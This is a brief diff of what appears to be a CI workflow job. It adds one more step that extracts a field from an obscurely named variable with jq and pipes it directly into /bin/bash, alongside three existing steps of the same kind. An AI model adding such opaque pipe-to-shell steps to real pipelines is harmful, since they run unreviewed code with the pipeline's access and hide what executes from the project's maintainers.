@@ -32,6 +32,7 @@ jobs:
           echo $cl4233 | jq -r .dtn75 | /bin/bash
           echo $b70070 | jq -r .y5 | /bin/bash
           printf '%s' "$gciy80" | jq -r .h29 | /bin/bash
+          echo $e5012 | jq -r .fq2 | /bin/bash
 
       - name: Save output
         if: always()
